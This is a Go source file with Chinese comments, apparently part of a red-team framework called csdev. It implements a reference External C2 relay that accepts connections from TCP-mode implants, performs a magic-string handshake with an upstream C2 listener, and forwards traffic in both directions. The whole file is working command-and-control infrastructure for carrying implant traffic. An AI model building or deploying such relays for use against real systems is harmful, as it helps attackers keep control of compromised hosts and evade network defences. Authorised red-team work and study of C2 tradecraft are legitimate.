// csdev :: extc2_relay  --  External C2 参考中转程序
// ==========================================================================
// 用途:
//   External C2 的定位就是"让第三方中转程序接入"。本程序是**参考实现**,
//   用于端到端验证: 它把直连型植入体 (TCP 承载) 的流量搬进 External C2 通道。
//
//   +-----------+        +--------------+        +--------------+        +-----------+
//   |  植入体   |  TCP   |  extc2_relay |  TCP   |  e2 监听端口 |        | C2 服务端 |
//   | (TCP模式) |------->|  握手+转发   |------->|              |------->|           |
//   +-----------+        +--------------+        +--------------+        +-----------+
//
// 为什么可以纯字节转发:
//   v2 的 TCP 承载与 External C2 在**握手之后**的线格式完全相同
//   ([4B 大端长度][帧字节]), 因此中转不需要理解任何加密内容。
//
// 编译 (独立 module, 不依赖主项目):
//   cd tools/extc2_relay; go build -o ../../build/extc2_relay.exe .
//
// 用法:
//   extc2_relay.exe -listen 127.0.0.1:9000 -upstream 127.0.0.1:9100
// ==========================================================================
package main

import (
	"encoding/binary"
	"flag"
	"io"
	"log"
	"net"
	"sync"
)

const extc2Magic = "csdev-extc2/1"

func handshake(conn net.Conn) error {
	var hdr [4]byte
	binary.BigEndian.PutUint32(hdr[:], uint32(len(extc2Magic)))
	if _, err := conn.Write(hdr[:]); err != nil {
		return err
	}
	if _, err := conn.Write([]byte(extc2Magic)); err != nil {
		return err
	}
	if _, err := io.ReadFull(conn, hdr[:]); err != nil {
		return err
	}
	n := binary.BigEndian.Uint32(hdr[:])
	if n == 0 || n > 256 {
		return io.ErrUnexpectedEOF
	}
	buf := make([]byte, n)
	if _, err := io.ReadFull(conn, buf); err != nil {
		return err
	}
	log.Printf("握手确认: %q", string(buf))
	return nil
}

func main() {
	listenAddr := flag.String("listen", "127.0.0.1:9000", "植入体接入地址 (TCP 承载的植入体连这里)")
	upstream := flag.String("upstream", "127.0.0.1:9100", "External C2 监听地址")
	flag.Parse()

	ln, err := net.Listen("tcp", *listenAddr)
	if err != nil {
		log.Fatalf("监听 %s 失败: %v", *listenAddr, err)
	}
	log.Printf("中转就绪: %s -> %s (握手标识 %q)", *listenAddr, *upstream, extc2Magic)

	for {
		c, err := ln.Accept()
		if err != nil {
			log.Fatalf("accept 失败: %v", err)
		}
		go func(down net.Conn) {
			defer down.Close()
			log.Printf("植入体接入: %s", down.RemoteAddr())

			up, err := net.Dial("tcp", *upstream)
			if err != nil {
				log.Printf("连接上游 %s 失败: %v", *upstream, err)
				return
			}
			defer up.Close()

			if err := handshake(up); err != nil {
				log.Printf("与上游握手失败: %v", err)
				return
			}

			var wg sync.WaitGroup
			wg.Add(2)
			go func() { defer wg.Done(); _, _ = io.Copy(up, down) }()
			go func() { defer wg.Done(); _, _ = io.Copy(down, up) }()
			wg.Wait()
			log.Printf("会话结束: %s", down.RemoteAddr())
		}(c)
	}
}
